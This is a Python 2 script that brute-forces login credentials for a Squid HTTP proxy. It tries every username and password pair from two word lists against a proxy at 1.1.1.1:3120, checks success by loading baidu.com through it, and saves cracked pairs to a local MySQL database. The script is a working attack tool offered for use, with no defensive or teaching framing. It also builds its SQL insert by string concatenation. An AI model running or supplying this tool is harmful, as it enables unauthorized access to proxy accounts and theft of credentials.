#!/usr/bin/env python
#coding=utf-8
#modify by robert qq:1972097
import urllib2
import os
import sys
import MySQLdb
import time

count = 0
# Configure MySQL Connections Here
host = "localhost"
mysqluser = "root"
mysqlpass = ""
db = MySQLdb.connect(host, mysqluser, mysqlpass, "squid")
c = db.cursor()
password = open("passwd.txt")
lines = password.readlines()
passwd = []
for line in lines:
    temp = line.strip()
    passwd.append(temp)
user = open("user.txt")
lines = user.readlines()
username = []
for line in lines:
    temp = line.strip()
    username.append(temp)
print "[+] Connecting to MySQL Database...."
c.execute("CREATE DATABASE IF NOT EXISTS `squid`;")
c.execute("CREATE TABLE IF NOT EXISTS `passwords` (`username` varchar(100) NOT NULL,`password` varchar(100) NOT NULL,PRIMARY KEY (`username`)) ENGINE=InnoDB DEFAULT CHARSET=latin1;")
db.commit()

for a in username:
    for j in passwd:
        proxy = urllib2.ProxyHandler({"http": "http://" + a + ":" + j + "@1.1.1.1:3120/"})
        opener = urllib2.build_opener(proxy)
        urllib2.install_opener(opener)
        try:
            html = urllib2.urlopen("http://www.baidu.com", timeout=10).readlines()
        except urllib2.URLError, e:
            html = ["Shit", "No", "No", "407"]
            print "Error : username is " + a + " and passwd is " + j
        if html[0] == "<!--STATUS OK-->\n" or len(html) == 24:
            count = count + 1
            print "Hurray! You got a Password.\n"
            print "And Count is " + str(count)
            print "Adding password to Database.\n"
            c.execute("INSERT INTO `passwords` (`username`,`password`) VALUES('" + a + "','" + j + "');")
            print "Added to Database.\n"
            db.commit()
        time.sleep(2)
